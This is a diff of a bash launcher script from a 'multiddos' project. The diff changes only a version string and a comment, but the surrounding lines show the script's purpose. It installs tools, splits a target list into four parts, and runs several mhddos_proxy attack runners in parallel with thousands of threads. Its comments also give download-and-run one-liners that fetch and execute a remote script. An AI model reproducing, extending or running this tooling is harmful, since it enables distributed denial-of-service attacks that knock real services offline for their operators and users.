@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.9.9c\n"
+clear && echo -e "Loading... v0.9.9d\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -130,7 +130,7 @@ while true; do
         tail -n 1000 /var/tmp/uaripper/uniq_targets.txt > /var/tmp/uaripper/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
-        cd /var/tmp/uaripper/; split -n l/4 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in several parts
+        cd /var/tmp/uaripper/; split -n l/4 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in N parts
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xaa.uaripper $methods $threads $args_to_pass &
         sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xab.uaripper $methods $threads $args_to_pass &
